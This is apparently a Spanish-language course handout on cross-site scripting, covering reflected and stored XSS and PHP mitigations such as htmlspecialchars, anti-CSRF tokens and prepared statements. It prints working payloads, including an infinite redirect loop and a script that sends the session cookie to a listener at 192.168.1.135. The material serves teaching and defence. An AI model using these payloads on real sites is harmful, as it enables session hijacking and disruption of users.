# XSS 
(Cross-Site Scripting)



---

## ¿Que es el XSS?

XSS significa Cross-Site Scripting y es una vulnerabilidad común de seguridad web que permite a un atacante inyectar código malicioso en una página web.

tipos:
Existen tres tipos principales de Cross-Site Scripting (XSS)

el XSS Reflected, el XSS Stored y el XSS DOM. En este curso vamos a hacer el XSS reflected y el XSS stored por falta de tiempo.

---
## ¿Como funciona?
En cualquier sitio donde podamos escribir 

<image src="/img/xss/1.png" alt="Descripción de la imagen">

---

## XSS Reflected y Stored
XSS Reflected

Aqui podemos ver una prueba de XSS que con un alert nos saque la cookie de sesion por un alert
```
<script>
    alert(document.cookie);
</script>
```

XSS stored

En este caso tenemos un XSS almacenado, le decimos almacenados o stored porque basicamente se quedad guarado en la pagina. como por ejemplo en comentarios.

este en si lo que se encarga es de hacer una continia redireccion a un sitio malicioso y llegando a afectar a la disponibilidad.
```
<script>
    while (true) {
        window.location = "http://mi-sitio-malicioso.com/";
    }
</script>
```

Este ataque por XSS lo que se encarga es de enviar la cookie de sesion a la ip 192.168.1.135 que tendremos un puerto abierto en modo de escucha.


```
<script>new Image().src="http://192.168.1.135/bogus.php?output="+document.cookie;</script>
```
-----
## formas de securizar estos errores.

### XSS Reflected

Aqui tenemos una forma de securizar un XSS reflected 

<image src="/img/xss/2.png" alt="Descripción de la imagen">

Primero, se verifica si existe un token Anti-CSRF y se comprueba si el token del usuario coincide con el token de sesión almacenado. Esto ayuda a prevenir ataques CSRF (Cross-Site Request Forgery) que intentan engañar al usuario para que realice acciones no deseadas en su sitio web.

Luego, el valor del parámetro "name" es almacenado en una variable llamada "$name" y se utiliza la función "htmlspecialchars" para escapar cualquier carácter especial y evitar posibles vulnerabilidades XSS (Cross-Site Scripting) que podrían ser explotadas por atacantes.

Finalmente, se muestra un mensaje en pantalla que contiene el valor del parámetro "name" para el usuario.

También hay una función llamada "generateSessionToken" que se encarga de generar un token Anti-CSRF único para la sesión actual del usuario.

### XSS stored

<image src="/img/xss/3.png" alt="Descripción de la imagen">

 Este código PHP procesa un formulario de entrada que contiene un mensaje y un nombre de usuario. Si se envía el formulario (el botón "btnSign" es presionado), el código realiza lo siguiente:

Verifica si hay un token Anti-CSRF y comprueba si el token del usuario coincide con el token de sesión almacenado para prevenir ataques CSRF.
Recupera el valor de los campos de entrada del formulario, "mtxMessage" y "txtName".
Sanitiza los valores ingresados por el usuario para evitar posibles vulnerabilidades XSS y SQL injection. Para esto, se eliminan las barras invertidas adicionales en el valor del campo y se escapan los caracteres especiales utilizando la función htmlspecialchars. Además, se utiliza la función mysqli_real_escape_string para escapar cualquier carácter especial en la entrada del usuario.
Inserta el mensaje y el nombre de usuario en la base de datos utilizando una consulta preparada.

